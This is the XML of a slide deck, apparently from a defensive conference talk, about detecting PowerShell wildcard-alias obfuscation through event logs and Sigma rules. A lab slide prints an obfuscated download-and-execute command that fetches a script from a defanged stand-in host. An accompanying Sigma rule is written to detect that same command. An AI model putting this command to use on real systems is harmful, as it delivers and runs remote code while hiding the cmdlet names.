            <a:ext cx="355949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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Captures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2302" y="1788795"/>
            <a:ext cx="445674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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Unique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312670"/>
            <a:ext cx="221361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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>4104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1360" y="2312670"/>
            <a:ext cx="355949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deobfuscated script text at parse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2302" y="2312670"/>
            <a:ext cx="4456748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reads the attacker's own deobfuscation for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236595"/>
            <a:ext cx="221361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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>4103 + 4100s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1360" y="3236595"/>
            <a:ext cx="355949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bound cmdlet + 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2302" y="3236595"/>
            <a:ext cx="4456748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survives when source text is hard to grep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160520"/>
            <a:ext cx="221361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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Sysmon 1/7/17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1360" y="4160520"/>
            <a:ext cx="355949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process launch, image load, named pipe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2302" y="4160520"/>
            <a:ext cx="4456748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Tahoma"/>
              </a:rPr>
              <a:t>engine-agnostic — survives PS logging being disabled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5341620"/>
            <a:ext cx="98107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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>No single source is enough. 4104 is richest but attacker-disableable; Sysmon survives that; 4103 is the cross-check between them.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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>LAB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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Raw 4104 — Wildcard Get-Alias → IEX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628900"/>
            <a:ext cx="10344150" cy="1905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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Log Name:  Microsoft-Windows-PowerShell/Operational</a:t>
            </a:r>
          </a:p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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>EventID:   4104</a:t>
            </a:r>
          </a:p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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Computer:  WKSTN17.contoso-corp.test</a:t>
            </a:r>
          </a:p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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ScriptBlockText:</a:t>
            </a:r>
          </a:p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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>.(gal ?e[?x])</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>(gal ?rm)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> 'hxxp[://]cdn-sync[.]test/m2.ps1')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5586412"/>
            <a:ext cx="10877550" cy="616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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gal</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> → 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iex</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>, inner </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>(gal ?rm)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>irm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>. Download and execute — neither cmdlet name typed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="147921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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>LAB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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Rule Meets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375" y="1769745"/>
            <a:ext cx="363378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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>wildcard-alias-iex.yml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2236470"/>
            <a:ext cx="6151245" cy="27022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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>alias:</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ScriptBlockText|contains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:</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>    - 'gal '</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>    - '</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gcm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 '</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>target:</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ScriptBlockText|contains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:</a:t>
            </a:r>
          </a:p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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>    - '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\?e[\?x]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'</a:t>
            </a:r>
          </a:p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2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>    - '</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>\?rm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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014538"/>
            <a:ext cx="347091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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Screenshot — to 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8095" y="2438400"/>
            <a:ext cx="3716655" cy="2292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Tahoma"/>
              </a:rPr>
              <a:t>This rule matching the previous slide's real log line — e.g. a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>pySigma</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>sigma-cli</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> conversion run against the captured 4104, or the hit highlighted in a SIEM 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5305425"/>
            <a:ext cx="10458450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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>condition: alias and target</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — and in Sigma </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> are wildcard </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>operators</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>, so escape them or this matches almost anything.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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Closing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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Alive in 2026. Invisible by Default.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2248852"/>
            <a:ext cx="9010650" cy="11877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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Active across the threat spectrum in 2026</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — espionage (GreenCharlie), suspected MuddyWater ClickFix, crimeware (ClearFake / Amatera / SectopRAT)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043362"/>
            <a:ext cx="9010650" cy="777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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Same primitive, four years later</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — the 2022 espionage wildcard trick now ships in commodity crimeware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5431155"/>
            <a:ext cx="9010650" cy="777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9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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Detectable only with logging turned on</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — 4104 + 4103 + Sysmon 1/7/17, correlated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="213380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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Closing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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Homework (Due Friday)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323148"/>
            <a:ext cx="9382125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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DAY 1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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Enable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> Script Block (4104) + Module Logging (4103)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828098"/>
            <a:ext cx="9382125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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DAY 2–3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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Deploy</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> a tuned Sysmon config — Event IDs 1, 7,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5009198"/>
            <a:ext cx="9382125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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DAY 4–5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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Validate</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> SIEM ingestion — confirmed, not assumed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2985263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552450"/>
            <a:ext cx="105156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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Closing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81075"/>
            <a:ext cx="1061085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34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EDF3E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What You're Leaving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3625" y="2006600"/>
            <a:ext cx="3406382" cy="308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spc="-150">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Everything from this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3625" y="2349500"/>
            <a:ext cx="3581400" cy="1003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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>bobby-tablez/</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr sz="2250" b="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ATT-CKcon-7.0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20025" y="2006600"/>
            <a:ext cx="3576300" cy="308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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Detection – pattern gen</a:t>
            </a:r>
            <a:endParaRPr sz="2025" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82948C"/>
              </a:solidFill>
              <a:latin typeface="Courier New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20025" y="2349500"/>
            <a:ext cx="3581400" cy="1003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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>bobby-</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>tablez</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr sz="2250" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>GlobWarden</a:t>
            </a:r>
            <a:endParaRPr sz="2250" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F2A53C"/>
              </a:solidFill>
              <a:latin typeface="Courier New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2975" y="3779520"/>
            <a:ext cx="314991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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>guides/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4170045"/>
            <a:ext cx="3149918" cy="100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37"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>6 manuals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> campaign, technique, telemetry, cheat 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8192" y="3779520"/>
            <a:ext cx="314991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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detection/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8192" y="4170045"/>
            <a:ext cx="3149918" cy="1084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37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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>5 Sigma rules · tuned Sysmon config · 4 sample 4104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2458" y="3779520"/>
            <a:ext cx="314991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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>tooling/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2458" y="4217670"/>
            <a:ext cx="3149918" cy="1065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37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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>t1027010_hunter.py</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> — static analysis, never executes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2538771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te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24025" y="2843732"/>
            <a:ext cx="94678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142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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma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24025" y="3842905"/>
            <a:ext cx="1087755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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Questions? Unobfuscated answers only.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3335944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62075D-DC6E-4CA7-857E-CE4E4DE6C92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422a943-ff3c-44f6-997a-4fee715c5d4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12648</TotalTime>
  <Words>1871</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>317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Courier New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Tim Peck</cp:lastModifiedBy>
  <cp:revision>43</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-19T17:40:24Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>